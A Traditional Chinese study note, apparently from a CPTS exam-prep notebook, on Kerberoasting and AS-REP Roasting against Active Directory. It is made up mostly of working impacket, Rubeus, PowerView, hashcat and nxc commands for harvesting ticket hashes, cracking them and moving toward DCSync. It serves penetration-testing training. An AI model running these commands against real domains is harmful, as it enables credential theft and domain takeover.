# 第 62 章 - Kerberos 認證資料攻擊

## 標籤

- #cpts
- #chapter
- #kerberos
- #credentials

## 學習目標

- 理解 Kerberoasting 與 AS-REP Roasting 的攻擊原理與差異。
- 能從 Linux（impacket）和 Windows（Rubeus/PowerView）執行兩種攻擊。
- 知道如何將取得的票證 hash 用 hashcat 離線破解。
- 能評估服務帳號的實際橫向移動價值。

---

## 理論基礎：兩種攻擊對比

| 攻擊 | 前提條件 | 取得材料 | 帳號設定 | hashcat -m |
|------|----------|----------|----------|------------|
| Kerberoasting | 任何 AD 帳號 | 服務票證（TGS）hash | 帳號需設定 SPN | 13100 |
| AS-REP Roasting | 無需帳號（或任意帳號） | AS-REP hash | 帳號需停用預驗證 | 18200 |

**Kerberoasting 原理**：任何已驗證的 AD 帳號都可以向 KDC 請求服務票證（TGS）。若服務帳號密碼弱，票證（由帳號密碼加密）可離線破解。

**AS-REP Roasting 原理**：若帳號停用 Kerberos 預驗證（`DONT_REQ_PREAUTH`），攻擊者可不需密碼直接向 KDC 請求 AS-REP，其中包含可離線破解的加密資料。

---

## 方法一：Kerberoasting（Linux）

```bash
# 取得所有有 SPN 的帳號 hash
impacket-GetUserSPNs DOMAIN/USER:PASSWORD -dc-ip DC_IP -request
# impacket-GetUserSPNs → 查詢並請求服務票證
# DOMAIN/USER:PASSWORD → 已知的 AD 帳號憑證（任意一般使用者即可）
# -dc-ip DC_IP → DC 的 IP
# -request     → 實際請求 TGS 並輸出 hash（不加此參數只列 SPN）

# 輸出到檔案
impacket-GetUserSPNs DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerb.hash
# -outputfile → 將 hash 儲存到檔案（一行一個）

# 只列出有 SPN 的帳號（不請求票證，先偵查）
impacket-GetUserSPNs DOMAIN/USER:PASSWORD -dc-ip DC_IP
# 輸出：帳號名稱、SPN、PasswordLastSet、LastLogon 等

# 用 hash 認證（當只有 NT hash 時）
impacket-GetUserSPNs -hashes ':NTHASH' DOMAIN/USER -dc-ip DC_IP -request
```

---

## 方法二：Kerberoasting（Windows / Rubeus）

```powershell
# 取得所有可 Kerberoast 的帳號
.\Rubeus.exe kerberoast /outfile:kerb.hash
# kerberoast → Kerberoasting 模式
# /outfile:kerb.hash → 輸出 hash 到檔案

# 針對特定帳號
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.hash
# /user:svc_sql → 只攻擊這個帳號的 TGS

# 只取 RC4 加密的票證（較易破解）
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerb.hash
# /rc4opsec → 降級請求 RC4-HMAC（而非 AES256），hashcat 更快破解
# 注意：AES256 加密票證需用 hashcat -m 19700，速度更慢

# PowerView 找有 SPN 的帳號
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
# 先偵查，再決定優先目標
```

---

## 方法三：AS-REP Roasting（Linux）

```bash
# 不需要帳號（若不知道哪些帳號停用預驗證）
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt
# GetNPUsers → 取得不需要預驗證的帳號（No Preauth Users）
# DOMAIN/    → 網域名稱（不需 user:pass）
# -no-pass   → 不提供密碼
# -usersfile users.txt → 嘗試列表中每個帳號

# 有帳號時（自動列出可攻擊的帳號）
impacket-GetNPUsers DOMAIN/USER:PASSWORD -dc-ip DC_IP -request
# 會列出所有停用預驗證的帳號並取得 hash

# 輸出到檔案
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt -outputfile asrep.hash
```

---

## 方法四：AS-REP Roasting（Windows / Rubeus）

```powershell
# 取得所有停用預驗證的帳號
.\Rubeus.exe asreproast /outfile:asrep.hash
# asreproast → AS-REP Roasting 模式
# /outfile   → 輸出 hash

# 針對特定帳號
.\Rubeus.exe asreproast /user:jsmith /outfile:jsmith.hash
```

---

## 方法五：離線破解票證 hash

```bash
# Kerberoasting hash 破解（RC4 票證）
hashcat -m 13100 -a 0 kerb.hash /usr/share/wordlists/rockyou.txt
# -m 13100 → Kerberos 5 TGS-REP RC4（Kerberoasting）

# Kerberoasting hash 破解（AES256 票證）
hashcat -m 19700 -a 0 kerb.hash /usr/share/wordlists/rockyou.txt
# -m 19700 → Kerberos 5 TGS-REP AES256（較慢）

# AS-REP Roasting hash 破解（RC4）
hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
# -m 18200 → Kerberos 5 AS-REP RC4（AS-REP Roasting）

# 加規則提升命中率
hashcat -m 13100 -a 0 kerb.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 破解成功後驗證
# 取得服務帳號密碼後，用 nxc 驗證
nxc smb DC_IP -u svc_sql -p 'Cracked_Password' -d DOMAIN
```

---

## 偵查：找高價值目標

```bash
# 查詢有 SPN 的帳號並看其群組
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP
# PasswordLastSet 久遠 → 密碼可能從沒改過 → 更易破解
# 服務帳號若在 Domain Admins 或高權限群組 → 高價值

# PowerView 找高權限服務帳號
Get-DomainUser -SPN | Where-Object {$_.memberof -match "Domain Admins"} | Select SamAccountName

# BloodHound 視覺化
# Kerberoastable Accounts → 看帳號的 AD 權限路徑
# 重點：是否有 DCSync、管理其他電腦的能力
```

---

## 攻擊流程決策

```
AD 環境偵查
    ↓
1. 有 AD 帳號？
    ├─ 是 → Kerberoasting（GetUserSPNs -request）
    └─ 否 → AS-REP Roasting（GetNPUsers -no-pass -usersfile）
    ↓
2. 取得 hash → 識別加密類型
    ├─ $krb5tgs$23$... → hashcat -m 13100（RC4）
    ├─ $krb5tgs$18$... → hashcat -m 19700（AES256）
    └─ $krb5asrep$23$... → hashcat -m 18200（AS-REP）
    ↓
3. 破解成功 → 確認帳號權限
    ├─ 普通服務帳號 → 憑證重用驗證
    └─ 高權限帳號 → DCSync / 直接 dump NTDS
```

---

## 速查表

```bash
# Kerberoasting（Linux）
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerb.hash

# AS-REP Roasting（Linux，不需帳號）
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt -outputfile asrep.hash

# 破解 Kerberoasting RC4 hash
hashcat -m 13100 -a 0 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 破解 AS-REP hash
hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 破解後驗證
nxc smb DC_IP -u svc_account -p 'CrackedPass' -d DOMAIN

# Rubeus Kerberoasting（Windows）
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerb.hash

# Rubeus AS-REP（Windows）
.\Rubeus.exe asreproast /outfile:asrep.hash
```

---

## 關聯筆記

- [[53-LDAP與Kerberos基礎|第 53 章 - LDAP 與 Kerberos 基礎]]
- [[61-Windows認證資料|第 61 章 - Windows 認證資料]]
- [[63-密碼重複使用與認證驗證|第 63 章 - 密碼重複使用與認證驗證]]
- [[07-Volume-7-Password-Attacks-Index|Vol.7 - Password Attacks]]
